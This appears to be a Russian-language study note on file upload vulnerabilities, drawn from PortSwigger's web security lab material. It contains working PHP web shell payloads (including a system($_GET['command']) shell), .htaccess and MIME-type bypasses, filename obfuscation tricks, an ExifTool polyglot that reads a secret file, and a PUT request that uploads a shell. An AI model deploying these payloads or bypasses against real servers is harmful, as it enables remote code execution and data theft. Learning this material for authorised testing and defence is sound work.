[File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
## Эксплуатация неограниченной загрузки файлов для развертывания веб-оболочки
`<?php echo file_get_contents('/path/to/target/file'); ?>`
`<?php echo system($_GET['command']); ?>`
`GET /example/exploit.php?command=id HTTP/1.1`

## Эксплуатация несовершенной проверки загружаемых файлов
##### Неправильная проверка типа файла
`Content-Disposition: form-data; name="image"; filename="exploit.php"` 
`Content-Type: image/jpeg`

### Предотвращение выполнения файлов в каталогах, доступных пользователю
Веб-серверы часто используют поле `filename` в запросах `multipart/form-data` для определения имени и места сохранения файла.

### Недостаточный черный список опасных типов файлов
Черные списки иногда можно обойти, используя менее известные, альтернативные расширения файлов, которые могут быть исполняемыми, например .php5, .shtml и так далее.

### Переопределение конфигурации сервера
Чтобы Apache выполнял файлы PHP, запрошенные клиентом, разработчики должны добавить следующие директивы в файл `/etc/apache2/apache2.conf`:
`LoadModule php_module /usr/lib/apache2/modules/libphp.so`
`AddType application/x-httpd-php .php`

Многие серверы также позволяют разработчикам создавать специальные конфигурационные файлы в отдельных каталогах, чтобы переопределить или добавить к одной или нескольким глобальным настройкам. Серверы Apache, например, загружают конфигурацию для конкретной директории из файла `.htaccess`, если таковой имеется. 

Для эксплуатации можно перезаписать этот файл содержимым:
`AddType application/x-httpd-php .l33t`
В запросе загрузки файла изменить заголовок:
`Content-Type: text/plain`
И загрузить файл `shell.l33t` с хедерами:
`Content-Disposition: form-data; name="avatar"; filename="shell.l33t"`
`Content-Type: application/x-httpd-php`

На серверах IIS с помощью файла `web.config`:
`<staticContent>`
    `<mimeMap fileExtension=".json" mimeType="application/json" />`
`</staticContent>`

### Обфускация расширений файлов
Несколько расширений.
`exploit.php.jpg`
Символы в конце строки
`exploit.php.`
Кодировка URL (или двойная) для точек, прямых и обратных косых черт
`exploit%2Ephp`
Точка с запятой или символы нулевого байта, закодированные в URL, перед расширением файла:
`exploit.asp;.jpg`
`exploit.asp%00.jpg`
Если удаление/замена опасных расширений выполняется не рекурсивно:
`exploit.p.phphp`
Многобайтовые символы юникода, которые могут быть преобразованы в нулевые байты и точки после преобразования или нормализации юникода. Последовательности типа `xC0 x2E`,` xC4 xAE` или `xC0 xAE` могут быть преобразованы в `x2E`, если имя файла анализируется как строка UTF-8, но затем преобразуются в символы ASCII перед использованием в пути.

### Неправильная проверка содержимого файла
С помощью специальных инструментов, таких как ExifTool, можно легко создать полиглотный файл JPEG, содержащий вредоносный код в своих метаданных:
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" kitten.jpg -o polyglot.php`

[Статья Bypass File Upload Restrictions](https://medium.com/codex/bypass-file-upload-restrictions-f30c88e1fccb)

### Эксплуатация file upload race conditions
рейс кондишн это жоска


## Эксплуатация уязвимостей загрузки файлов без удаленного выполнения кода
##### Загрузка вредоносных сценариев на стороне клиента.
Если можно загружать файлы HTML или изображения SVG, потенциально можно использовать теги `<script>` для создания [хранимых XSS](xss.md).

Обращаем внимание на то, что из-за ограничений [same-origin policy](cors.md) эти виды атак будут работать только в том случае, если загруженный файл будет обслуживаться из того же источника, в который был загружен.

### Эксплуатация уязвимостей при парсинге загруженных файлов
Если кажется, что загруженный файл и хранится, и обслуживается безопасно, в крайнем случае можно попробовать использовать уязвимости, связанные с разбором или обработкой различных форматов файлов. Например, вы знаете, что сервер анализирует файлы на основе XML, такие как файлы Microsoft Office .doc или .xls, это может быть потенциальным вектором для атак [XXE-инъекций](xxe-injection.md).

## Загрузка файлов с помощью PUT
Стоит отметить, что некоторые веб-серверы могут быть настроены на поддержку запросов PUT. При отсутствии соответствующей защиты это может стать альтернативным способом загрузки вредоносных файлов, даже если функция загрузки недоступна через веб-интерфейс:
`PUT /images/exploit.php HTTP/1.1`
`Host: vulnerable-website.com`
`Content-Type: application/x-httpd-php`
`Content-Length: 49`
``
`<?php echo file_get_contents('/path/to/file'); ?>`

Можно попробовать отправить запросы `OPTIONS` на различные конечные точки, чтобы проверить те из них, которые поддерживают метод `PUT`.